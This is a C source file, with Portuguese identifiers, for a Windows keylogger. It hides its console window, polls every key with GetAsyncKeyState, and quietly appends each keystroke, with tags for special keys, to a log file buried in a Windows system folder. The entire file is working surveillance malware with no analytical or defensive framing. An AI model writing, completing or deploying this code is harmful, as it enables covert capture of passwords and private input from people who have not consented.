#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Winuser.h>

#define LOG "C:\\Windows\\debug\\WIA\\save.txt"
#define wf fprintf
#define MAX_BUF 1024

#define TRUE 1
#define FALSE 0

void * getkey( void );
void * checarkey( int );
void * escreverdados( char * );
void * die( char *, int );

int main( int argc, char *argv[] ) {
	getkey();	
	return 0;
}

void * die(char *str, int erro) {
	wf(stderr, "%s", str);
	exit(erro);
	
	return ( void *)0;
}

void * escreverdados( char *string ) {
    	FILE *ptrarquivo = NULL;
    	ptrarquivo = fopen(LOG, "a+");
    	
    	if ( ptrarquivo == NULL ) {
    		die("erro ao abrir arquivo. \n", -1);
		} 
    	
		fputs(string, ptrarquivo);
		fclose(ptrarquivo);
		  
}

void * checarkey(int key) { 
	 switch(key) {
	     case VK_SPACE:
                escreverdados(" [SPACE] ");
                break;
            case VK_SHIFT:
                escreverdados(" [SHIFT] ");
                break;
            case VK_LBUTTON:
                escreverdados(" [LBUTTON] ");
                break;
            case VK_MBUTTON:
                escreverdados(" [MBUTTON] ");
                break;
            case VK_CONTROL:
                escreverdados(" [CONTROL] ");
                break;
            case VK_RETURN:
                escreverdados( " [ENTER] " );
                break;
            case VK_ESCAPE:
                escreverdados(" [ESC] ");
                break;
            case VK_LSHIFT:
                escreverdados( "[LSHIFT]" );
                break;
            case VK_RSHIFT:
                escreverdados( " [RSHIFT] " );
                break;
            case VK_OEM_PERIOD:
                escreverdados(" [PONTO] ");
                break;
            case VK_BACK:
                escreverdados(" [BACKSPACE] ");
                break;
            case VK_TAB:
                escreverdados(" [TAB] " );
                break;
                default:
                        return FALSE;
         }
}

void * getkey( void ) {
    unsigned char key;
    
    HWND ft; // não deixar a janela visível 
    AllocConsole();
	ft = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(ft, 0);
		 while (1) {
		 	
		 	 Sleep(2);
		 	 for (key = 8; key<=255; key++) {
		 	 	 if (GetAsyncKeyState(key) == -32767) {
		 	 	 	
		 	 	 	  if(checarkey(key) == FALSE) {
    	                  FILE *ptrarquivo = fopen(LOG, "a+");
		 	 	 	  	  wf(ptrarquivo, "%c", key);
		                  fclose(ptrarquivo);
		                  
					  }
				   }
				   if (key == 255) {
				   	   key = 8;
				   }
			  }
		 }
    	
} 


